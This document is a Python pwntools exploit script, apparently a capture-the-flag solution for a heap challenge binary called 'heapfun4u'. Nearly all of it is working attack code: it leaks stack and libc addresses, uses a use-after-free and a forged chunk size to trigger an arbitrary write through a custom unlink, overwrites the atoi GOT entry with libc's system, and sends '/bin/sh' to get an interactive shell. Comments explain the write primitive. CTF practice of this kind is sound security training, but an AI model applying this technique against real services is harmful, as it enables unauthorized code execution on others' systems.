#!/usr/bin/env python3

from pwn import *

exe = ELF("./heapfun4u")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
context.binary = exe


def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    def nice_guy():
    	r.sendline("N")
    	r.recvuntil("Here you go: 0x")
    	leak = int(r.recvn(12), 16)
    	return leak

    def alloc(size):
    	r.sendline("A")
    	r.recvuntil("Size: ")
    	r.sendline(str(size))

    def free(idx):
    	r.sendline("F")
    	r.recvuntil("Index: ")
    	r.sendline(str(idx))

    def write(idx, data):
    	r.sendline("W")
    	r.recvuntil("Write where: ")
    	r.sendline(str(idx))
    	r.recvuntil("Write what: ")
    	r.send(data)

    stack = nice_guy()
    log.info("stack address leak: {}".format(hex(stack)))
    
    alloc(104)
    alloc(104) # dummy
    alloc(50) # in order for selected_chunk != *(0x0602558) and so will follow the code path with the arbitrary write
    alloc(100) # prevent consolidation with "top chunk"
    r.sendline("F")
    r.recvuntil("0x")
    leak = int(r.recvn(12), 16) - 8
    r.sendline("1")
    
    libc.address = leak - 0x5ee000
    log.info("libc base address: {}".format(hex(libc.address)))
    log.info("mmap'd place base address: {}".format(hex(leak)))

    bss = 0x6020b8 # 4th chunk entry
    offset = bss - (leak + 0xd8)
    
    free(3)
    write(2, "B"*(104 - 8) + p64(offset & 0xFFFFFFFFFFFFFFFF))
    write(1, "A"*88 + p64(leak+0xd8) + p64(0x00602090)) # use-after-free corrupt ptrs

    alloc(100) 
    '''
    - it'll perform some kind of unlink.
    
    next_chunk[-2] = leak+0xd8 
    next_chunk[-1] = 0x00602090

	if (next_chunk[-1] != (ulong *)0x0) {
        *(ulong **)((long)next_chunk[-1] + ((*next_chunk[-1] & 0xfffffffffffffffc) - 8)) =
        *next_chunk[-2];
    }

    if (*next_chunk[-2] != (ulong *)0x0) {
        *(ulong **)((long)*next_chunk[-2] + (**next_chunk[-2] & 0xfffffffffffffffc)) =
        next_chunk[-1];

    - it will use each ptr's addr and the size at that addr to calculate the place where the other ptr is written to
    - I created a fake size (after calculating the offset) so that the 4th entry will be overwritten with 0x00602090 (the start of .bss)
    - we have to keep in mind that the reverse will happen to. that's why I couldn't overwrite with libc's system directly because it will try to write at invalid addr
    - .bss was fine and we also had access to the ptr storage. We can now control the ptrs 
    '''
    
    write(4, p64(0)*2 + p64(exe.got['atoi']))
    write(1, p64(libc.symbols['system']))
    
    r.sendline("A")
    r.sendline("/bin/sh")

    #gdb.attach(r)	
    r.interactive()


if __name__ == "__main__":
    main()
'''
nice guy gives you stack leak
inconsistency - starts search at top chunk but also can re use chunks?
	
		- top chunk is always the last freed chunk?
no NULL append when writing

size doesn't count the metadata?

'''